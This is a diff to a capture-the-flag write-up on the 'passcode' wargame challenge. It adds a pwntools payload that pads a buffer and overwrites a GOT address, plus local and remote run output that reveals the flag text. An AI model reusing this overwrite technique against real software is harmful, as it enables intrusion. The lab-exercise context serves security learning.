@@ -1039,8 +1039,24 @@ So we input:
 ```python
 from pwn import p32
 import sys
-payload = b'A'*96 + p32(0x804a004) + b'134514147\n' 
+payload = b'A'*96 + p32(0x804a004) + b'134514147' 
 sys.stdout.buffer.write(payload)
+```
+
+```
+$ python3 payload.py | ./passcode 
+Toddler's Secure Login System 1.0 beta.
+enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+/bin/cat: flag: No such file or directory
+```
+
+Nice, now for the remote:
+
+```
+passcode@pwnable:~$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x04\xa0\x04\x08134514147" | ./passcode
+Toddler's Secure Login System 1.0 beta.
+enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+Sorry mom.. I got confused about scanf usage :(
 ```
 
 <br>
